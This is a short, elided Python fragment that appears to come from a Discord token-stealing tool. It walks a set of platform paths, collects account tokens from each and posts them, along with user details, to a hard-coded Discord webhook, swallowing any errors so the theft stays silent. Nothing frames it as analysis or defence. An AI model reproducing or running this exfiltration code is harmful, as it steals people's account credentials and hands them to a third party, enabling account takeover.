    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                requests.post('https://discord.com/api/webhooks/1335610082582331545/tv6RrG3rRYiBDVKun7ay_hwkHdknWXmweXgAy3dzu7oXWKgXmPgBu6nXBCpqlDyf4-wE', json=embed_user, headers=getheaders())
            except:
                continue
